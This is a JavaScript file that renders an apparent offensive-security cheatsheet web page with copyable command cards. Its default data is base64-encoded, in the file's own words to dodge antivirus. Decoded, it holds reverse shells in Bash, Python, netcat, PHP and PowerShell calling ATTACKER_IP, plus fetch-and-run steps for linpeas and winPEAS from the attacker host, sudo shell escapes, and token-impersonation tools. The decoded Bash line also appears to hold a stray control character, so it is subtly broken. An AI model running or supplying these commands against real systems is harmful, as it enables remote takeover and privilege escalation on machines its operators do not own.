// Cheatsheet data — loads from localStorage (managed via admin panel).
// On first visit seeds from built-in defaults.
(function () {
  const STORAGE_KEY = 'bensec_cheatsheets';

  // ── Default data (base64 commands to avoid AV false positives) ──
  const d = atob;
  const DEFAULTS = [
    {
      id: 'revshells', label: '🐚 Rev Shells', type: 'commands',
      groups: [
        { id: 'g1', heading: 'Bash',                command: d('YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIBo+JjE=') },
        { id: 'g2', heading: 'Python 3',             command: d('cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIkFUVEFDS0VSX0lQIixQT1JUKSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pJw==') },
        { id: 'g3', heading: 'Netcat (traditional)', command: d('bmMgLWUgL2Jpbi9zaCBBVFRBQ0tFUl9JUCBQT1JU') },
        { id: 'g4', heading: 'Netcat (OpenBSD)',     command: d('cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgQVRUQUNLRVJfSVAgUE9SVCA+L3RtcC9m') },
        { id: 'g5', heading: 'PHP',                  command: d('cGhwIC1yICckc29jaz1mc29ja29wZW4oIkFUVEFDS0VSX0lQIixQT1JUKTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=') },
        { id: 'g6', heading: 'PowerShell',           command: d('cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCdBVFRBQ0tFUl9JUCcsUE9SVCk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKSI=') },
        { id: 'g7', heading: 'Shell Upgrade',        command: d('cHl0aG9uMyAtYyAnaW1wb3J0IHB0eTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJwojIHRoZW4gQ3RybCtaCnN0dHkgcmF3IC1lY2hvOyBmZwpleHBvcnQgVEVSTT14dGVybQ==') },
        { id: 'g8', heading: 'Listener',             command: d('bmMgLWx2bnAgUE9SVA==') }
      ]
    },
    {
      id: 'linprivesc', label: '🐧 Linux PrivEsc', type: 'commands',
      groups: [
        { id: 'g1', heading: 'Quick enumeration', command: d('aWQKd2hvYW1pCnVuYW1lIC1hCmZpbmQgLyAtcGVybSAtNDAwMCAtdHlwZSBmIDI+L2Rldi9udWxsCmNhdCAvZXRjL2Nyb250YWIKcHMgYXV4CnNzIC10dWxucA==') },
        { id: 'g2', heading: 'Sudo abuse',        command: d('c3VkbyAtbApzdWRvIHZpbSAtYyAnOiFiYXNoJwpzdWRvIGZpbmQgLyAtZXhlYyAvYmluL3NoIFw7CnN1ZG8gcHl0aG9uMyAtYyAnaW1wb3J0IG9zOyBvcy5zeXN0ZW0oIi9iaW4vYmFzaCIpJw==') },
        { id: 'g3', heading: 'LinPEAS',           command: d('cHl0aG9uMyAtbSBodHRwLnNlcnZlciA4MDAwCmN1cmwgaHR0cDovL0FUVEFDS0VSX0lQOjgwMDAvbGlucGVhcy5zaCB8IGJhc2g=') }
      ]
    },
    {
      id: 'winprivesc', label: '🪟 Windows PrivEsc', type: 'commands',
      groups: [
        { id: 'g1', heading: 'Quick enumeration',   command: d('d2hvYW1pIC9wcml2CnN5c3RlbWluZm8KbmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMKdGFza2xpc3QgL3N2Yw==') },
        { id: 'g2', heading: 'WinPEAS',             command: d('Y2VydHV0aWwgLXVybGNhY2hlIC1mIGh0dHA6Ly9BVFRBQ0tFUl9JUDo4MDAwL3dpblBFQVN4NjQuZXhlIHdpbnBlYXMuZXhlCi5cd2lucGVhcy5leGU=') },
        { id: 'g3', heading: 'Token impersonation', command: d('UHJpbnRTcG9vZmVyLmV4ZSAtaSAtYyBjbWQKR29kUG90YXRvLmV4ZSAtY21kICJjbWQgL2Mgd2hvYW1pIg==') }
      ]
    },
    {
      id: 'nmap', label: '🔍 Nmap', type: 'commands',
      groups: [
        { id: 'g1', heading: 'Quick scan',      command: d('bm1hcCAtc0MgLXNWIC1vTiBzY2FuLnR4dCBUQVJHRVQ=') },
        { id: 'g2', heading: 'Full port scan',  command: d('bm1hcCAtcC0gLVQ0IFRBUkdFVA==') },
        { id: 'g3', heading: 'UDP scan',        command: d('bm1hcCAtc1UgLS10b3AtcG9ydHMgMjAgVEFSR0VU') },
        { id: 'g4', heading: 'Vuln scan',       command: d('bm1hcCAtLXNjcmlwdCB2dWxuIFRBUkdFVA==') },
        { id: 'g5', heading: 'Aggressive scan', command: d('bm1hcCAtQSAtVDQgVEFSR0VU') }
      ]
    },
    {
      id: 'ports', label: '🔌 Ports', type: 'ports', groups: []
    }
  ];

  const ports = [
    ['21','FTP','File Transfer Protocol'],['22','SSH','Secure Shell'],
    ['23','Telnet','Unencrypted remote access'],['25','SMTP','Email sending'],
    ['53','DNS','Domain Name System'],['80','HTTP','Web traffic'],
    ['88','Kerberos','Authentication protocol'],['110','POP3','Email retrieval'],
    ['111','RPCbind','RPC port mapper'],['135','MSRPC','Microsoft RPC'],
    ['139','NetBIOS','SMB over NetBIOS'],['143','IMAP','Email access'],
    ['389','LDAP','Directory services'],['443','HTTPS','Encrypted web traffic'],
    ['445','SMB','Windows file sharing'],['993','IMAPS','Encrypted IMAP'],
    ['995','POP3S','Encrypted POP3'],['1433','MSSQL','Microsoft SQL Server'],
    ['1521','Oracle','Oracle DB listener'],['3306','MySQL','MySQL database'],
    ['3389','RDP','Remote Desktop'],['5432','PostgreSQL','PostgreSQL database'],
    ['5900','VNC','Virtual Network Computing'],['5985','WinRM','Windows Remote Mgmt'],
    ['6379','Redis','In-memory data store'],['8080','HTTP-Alt','Alternative HTTP'],
    ['8443','HTTPS-Alt','Alternative HTTPS'],['27017','MongoDB','NoSQL database']
  ];

  // ── Load sections from localStorage or seed defaults ──
  function getSections() {
    try {
      const stored = JSON.parse(localStorage.getItem(STORAGE_KEY));
      if (stored && stored.length) return stored;
    } catch {}
    // First visit — seed defaults (store commands as plain text)
    const seeded = DEFAULTS.map(s => ({
      id: s.id, label: s.label, type: s.type,
      groups: s.groups.map(g => ({ id: g.id, heading: g.heading, command: g.command }))
    }));
    localStorage.setItem(STORAGE_KEY, JSON.stringify(seeded));
    return seeded;
  }

  // ── Render ──
  const tabsEl    = document.getElementById('cs-tabs');
  const container = document.getElementById('cheatsheet-content');
  if (!container || !tabsEl) return;

  const sections = getSections();

  sections.forEach((sec, i) => {
    // Tab button
    const btn = document.createElement('button');
    btn.className = 'cs-tab-btn' + (i === 0 ? ' active' : '');
    btn.textContent = sec.label;
    btn.dataset.target = sec.id;
    btn.addEventListener('click', () => switchTab(sec.id));
    tabsEl.appendChild(btn);

    // Panel
    const panel = document.createElement('div');
    panel.className = 'cs-panel hidden';
    panel.id = 'cs-panel-' + sec.id;

    if (sec.type === 'ports') {
      panel.innerHTML =
        '<div class="cs-panel-inner">' +
          '<div class="cs-search-bar"><span class="cs-search-icon">⌕</span>' +
          '<input type="text" id="port-search" placeholder="search port or service..." autocomplete="off"></div>' +
          '<div class="port-table" id="port-table">' +
            '<div class="port-row port-header"><span class="port-num">Port</span><span class="port-svc">Service</span><span class="port-note">Description</span></div>' +
            ports.map(p =>
              '<div class="port-row" data-port="' + p[0] + '" data-svc="' + p[1].toLowerCase() + '">' +
              '<span class="port-num">' + p[0] + '</span><span class="port-svc">' + p[1] + '</span><span class="port-note">' + p[2] + '</span></div>'
            ).join('') +
          '</div></div>';
    } else {
      const cards = (sec.groups || []).map(g =>
        '<div class="cheat-card" data-id="' + g.id + '">' +
          '<div class="cheat-card-header">' +
            '<span class="cheat-card-title">' + escHtml(g.heading) + '</span>' +
            '<button class="copy-btn">copy</button>' +
          '</div>' +
          '<pre class="cheat-card-code"><code>' + escHtml(g.command) + '</code></pre>' +
        '</div>'
      ).join('');
      panel.innerHTML = '<div class="cs-panel-inner"><div class="cheat-grid">' + cards + '</div></div>';
    }

    container.appendChild(panel);
  });

  switchTab(sections[0].id);

  function switchTab(id) {
    document.querySelectorAll('.cs-tab-btn').forEach(b => b.classList.toggle('active', b.dataset.target === id));
    document.querySelectorAll('.cs-panel').forEach(p => p.classList.toggle('hidden', p.id !== 'cs-panel-' + id));
  }

  // Copy on button click
  container.addEventListener('click', e => {
    const btn = e.target.closest('.copy-btn');
    if (!btn) return;
    const code = btn.closest('.cheat-card').querySelector('code');
    if (!code) return;
    navigator.clipboard.writeText(code.textContent).then(() => {
      btn.textContent = '✓ copied'; btn.classList.add('copied');
      setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1600);
    });
  });

  // Copy on card click
  container.addEventListener('click', e => {
    const card = e.target.closest('.cheat-card');
    if (!card || e.target.closest('.copy-btn')) return;
    const code = card.querySelector('code');
    if (!code) return;
    navigator.clipboard.writeText(code.textContent).then(() => {
      const btn = card.querySelector('.copy-btn');
      if (btn) { btn.textContent = '✓ copied'; btn.classList.add('copied'); setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1600); }
      card.classList.add('flash');
      setTimeout(() => card.classList.remove('flash'), 400);
    });
  });

  // Port search
  container.addEventListener('input', e => {
    if (e.target.id !== 'port-search') return;
    const q = e.target.value.toLowerCase().trim();
    document.querySelectorAll('#port-table .port-row:not(.port-header)').forEach(row => {
      row.style.display = (!q || row.dataset.port.includes(q) || row.dataset.svc.includes(q) || row.textContent.toLowerCase().includes(q)) ? '' : 'none';
    });
  });

  function escHtml(str) {
    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  }

  // Expose for admin
  window.csEngine = { getSections, STORAGE_KEY };
})();
